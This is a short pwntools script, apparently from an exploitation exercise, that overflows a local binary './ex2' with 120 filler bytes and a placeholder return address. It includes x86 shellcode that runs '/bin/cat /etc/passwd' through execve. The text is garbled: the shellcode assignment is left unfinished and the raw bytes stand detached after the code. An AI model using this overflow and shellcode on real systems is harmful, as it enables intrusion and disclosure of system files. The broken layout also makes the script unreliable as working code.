#! /usr/bin/python3

from pwn import *

WRONG_WAY_ADRESS = 0x0





SHELL_CODE = b


io = process('./ex2')
print(io.recvline().decode())
io.sendline(b'A' * 120 + pack(WRONG_WAY_ADRESS))
for _ in range(10):
    try:
        print(io.readline(keepends=False))
    except EOFError:
        pass
\x31\xc0\x99\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x73\x73\x77\x64
\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80
